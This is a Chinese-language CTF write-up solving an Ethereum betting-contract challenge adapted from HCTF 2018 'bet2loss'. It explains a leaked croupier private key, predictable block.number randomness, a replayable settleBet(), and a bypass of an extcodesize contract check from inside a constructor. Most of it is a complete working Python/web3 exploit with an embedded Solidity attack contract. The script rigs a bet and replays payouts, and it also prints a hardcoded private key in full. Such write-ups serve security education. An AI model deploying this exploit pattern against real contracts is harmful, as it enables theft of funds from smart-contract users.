# Bet2Loss_v2

## 题目简述

题目改编自 HCTF 2018 `bet2loss`，是以太坊合约题。源码中泄露了 `croupier` 私钥，`onlyCroupier` 保护的函数可以由该账号直接调用。下注记录绑定 `player`，而 `settleBet()` 可重放结算；flag 需要 300k，单次 bet 最多 100k，因此需要一次开注后重放两次。为了稳定赢，需要预测 `diceWin`，也就是控制或提前知道参与伪随机的 `block.number`；题目用 `extcodesize` 实现 `isContract()`，但合约构造函数中 `extcodesize(this)==0`，可在 constructor 中绕过合约检测并完成稳赢下注。

## 解题过程

本题改编自 HCTF 2018 bet2loss; bet2loss 的 web 源码已于 github 公开 \[[1](https://github.com/LoRexxar/HCTF2018_bet2loss)\].

在 settings.py 中有泄漏 *croupier* 的私钥, onlyCroupier 的函数可以直接拿此账号调用. 获取 flag 的余额门槛是 300000，主要调用链为 `settleBet() -> settleBetCommon() -> sendFunds()`。

注意到 bet 绑定 *player*, `settleBet()` 可以施行 replay attack, 收益与重放次数以及 *diceWin* 有关. 由于限制了开注次数, 因此需要最大化 *diceWin* (运气好, all in 成功了我也没话说). 每次 bet 最多获得 100k, flag 需要 300k, 开注一次,重放两次即可.

计算 dice 的方法伪随机, 拿到账号后可以自己实现签名, 需要预测的是 *block.number*. 这可以部署合约来提前获取. `settleBet()` 里有个 `isContract()`，它通过 EVM 的 `EXTCODESIZE` opcode 判断调用者地址上是否已有代码。这个检查对普通已部署合约有效，但合约 constructor 执行期间代码还没有写入账户，`extcodesize(address(this))` 返回 0，因此攻击合约可以在 constructor 内调用目标合约，绕过“禁止合约下注”的限制并完成稳赢下注。

实际比赛中，几乎没有队伍去考虑绕过 `isContract()`，也有队伍没有发现泄漏的私钥，转而爆破 *reveal* 或从 Web 层交互切入。这里的关键判断仍然是先确认链上源码和配置中是否已经泄露了签名能力。

注意到有些队伍生成签名的时候卡住了, 这里稍微提一下. 合约中看起来并没有改过, 但是 *commitLastBlock* 的类型变了。`abi.encodePacked()` 使用 Solidity 的非标准 packed encoding：短于 32 字节的静态类型会按自身字节宽度直接拼接，不做 32 字节填充；动态类型则原地编码且不带长度。因此 `uint40 commitLastBlock` 只占 5 字节，和 HCTF 原题中按更宽类型拼接出的待签名字节不同，签名脚本必须按 `commitLastBlock.to_bytes(5, 'big') + commit` 生成哈希，不能直接复用旧脚本。

```python
from web3 import Web3
from solc import compile_source
import os, random

infura_url = '<ropsten_rpc_url>'
web3 = Web3(Web3.HTTPProvider(infura_url))
accounts = {
    'player': {
        'addr': '0x8F1D24E114aA84bC66d8950142008348b4c6cEd0',
        'priv': ''
    }, 
    'croupier': {
        'addr': '0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C',
        'priv': '6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12'
    }
}

def sign(reveal):
    result = {'reveal':reveal}

    commitLastBlock = web3.eth.blockNumber + 250
    result['commitLastBlock'] = commitLastBlock

    commit = web3.sha3( reveal.to_bytes(32, 'big') )
    result['commit'] = int.from_bytes(commit, 'big')

    message = commitLastBlock.to_bytes(5, 'big') + commit
    message_hash = web3.sha3(message)
    signature = web3.eth.account.signHash(message_hash, private_key=accounts['croupier']['priv'])
    result['r'] = signature['r']
    result['s'] = signature['s']
    result['v'] = signature['v']

    return result

def transact(_to, _data):
    tx = {
        'from': defaultAccount['addr'],
        'nonce': web3.eth.getTransactionCount(defaultAccount['addr']),
        'to': _to,
        'gas': 1000000,
        'value': 0,
        'gasPrice': web3.eth.gasPrice * 2,
        'data': _data,
    }
    signed_tx = web3.eth.account.signTransaction(tx, defaultAccount['priv'])
    tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
    return tx_receipt

def settleBet():
    transact( gameAddress, web3.sha3(b'settleBet(uint256)')[:4].hex() + hex(reveal)[2:].rjust(64, '0') )

def getFlag():
    transact( attackAddress, web3.sha3(b'getFlag()')[:4].hex() )

attack = '''pragma solidity ^0.4.24;
contract Attack {
    address constant croupier = 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C;
    uint8 constant modulo = 100;
    uint40 constant wager = 1000;
    uint8 betnumber;
    address game;

    constructor(address _game, uint40 commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v, uint reveal) public {
        game = _game;
        bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit));
        require (croupier == ecrecover(signatureHash, v, r, s), "signature is not valid.");
        require (commit == uint(keccak256(abi.encodePacked(reveal))), "commit is not valid.");

        bytes32 entropy = keccak256(abi.encodePacked(reveal, uint(block.number)));
        uint _betnumber = uint(entropy) % uint(modulo);
        betnumber = uint8(_betnumber);

        game.call(bytes4(keccak256("placeBet(uint8,uint8,uint40,uint40,uint256,bytes32,bytes32,uint8)")),betnumber,modulo,wager,commitLastBlock,commit,r,s,v);

    }

    function getFlag() external {
        game.call(bytes4(keccak256("PayForFlag()")));
        selfdestruct(0);
    }

}'''

defaultAccount = accounts['player']
gameAddress = ''

reveal = random.randint(1, 2**40)
result = sign(reveal)

compiled_sol = compile_source(attack)
contract_interface = compiled_sol['<stdin>:Attack']
bytecode = contract_interface['bin']
bytecode += gameAddress[2:].rjust(64, '0')
bytecode += hex( result['commitLastBlock'] )[2:].rjust(64, '0')
bytecode += hex( result['commit'] )[2:].rjust(64, '0')
bytecode += hex( result['r'] )[2:].rjust(64, '0')
bytecode += hex( result['s'] )[2:].rjust(64, '0')
bytecode += hex( result['v'] )[2:].rjust(64, '0')
bytecode += hex( result['reveal'] )[2:].rjust(64, '0')
tx = {
    'from': defaultAccount['addr'],
    'nonce': web3.eth.getTransactionCount(defaultAccount['addr']),
    'gas': 1000000,
    'value': 0,
    'gasPrice': web3.eth.gasPrice * 2,
    'data': '0x' + bytecode,
}
signed_tx = web3.eth.account.signTransaction(tx, defaultAccount['priv'])
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
attackAddress =  tx_receipt.contractAddress
print('attack Address: ' + attackAddress)

defaultAccount = accounts['croupier']
for _ in range(3):
    settleBet()
    print('settleBet')

defaultAccount = accounts['player']
getFlag()
print('done')
```

## 方法总结

- 核心技巧：用泄露的庄家私钥生成合法 commit 签名，在攻击合约 constructor 中绕过 `isContract()`，预测当前块数并下注，然后重放 `settleBet()` 放大收益。
- 识别信号：链上博彩合约用 `block.number`/`reveal` 做伪随机、`settle` 可重复调用、源码泄露签名私钥时，应同时检查随机性和 replay。
- 复用要点：`abi.encodePacked()` 会受参数类型影响，复用旧题脚本时必须核对 `commitLastBlock` 类型；`extcodesize` 不能可靠阻止 constructor 阶段的合约调用。

